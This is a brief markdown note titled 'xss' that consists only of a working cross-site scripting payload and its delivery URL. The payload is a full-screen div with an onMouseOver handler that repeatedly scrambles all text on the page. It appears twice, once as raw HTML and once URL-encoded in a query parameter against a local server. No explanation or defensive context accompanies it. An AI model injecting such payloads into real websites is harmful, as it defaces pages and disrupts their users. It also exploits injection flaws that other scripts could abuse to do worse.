# xss

```html
<div style="position:fixed; top:0; right:0; bottom:0; left:0;" onMouseOver="function mangleText(e){return new Promise(function(t){if(e.hasChildNodes())return Promise.all(Array.from(e.childNodes.values()).map(mangleText)).then(function(){return t()});if(e.nodeType!==Node.TEXT_NODE)return t();if(!e.textContent||!e.textContent.trim())return t();var n=e.textContent.trim().split('').map(function(e){return e.charCodeAt(0)}).map(function(e){return(e*Math.round(1e3*Math.random()))%65535}).map(function(e){return String.fromCharCode(e)}).join('');setTimeout(function(){return e.textContent=n,t()},1e3*Math.random())})}function mangleTextForever(e){mangleText(e).then(function(){return mangleTextForever(e)})}mangleTextForever(document.body);"></div>
```

```
http://localhost:3000/?s=%3Cdiv%20style=%22position:fixed;%20top:0;%20right:0;%20bottom:0;%20left:0;%22%20onMouseOver=%22function%20mangleText(e){return%20new%20Promise(function(t){if(e.hasChildNodes())return%20Promise.all(Array.from(e.childNodes.values()).map(mangleText)).then(function(){return%20t()});if(e.nodeType!==Node.TEXT_NODE)return%20t();if(!e.textContent||!e.textContent.trim())return%20t();var%20n=e.textContent.trim().split(%27%27).map(function(e){return%20e.charCodeAt(0)}).map(function(e){return(e*Math.round(1e3*Math.random()))%2565535}).map(function(e){return%20String.fromCharCode(e)}).join(%27%27);setTimeout(function(){return%20e.textContent=n,t()},1e3*Math.random())})}function%20mangleTextForever(e){mangleText(e).then(function(){return%20mangleTextForever(e)})}mangleTextForever(document.body);%22%3E%3C/div%3E
```
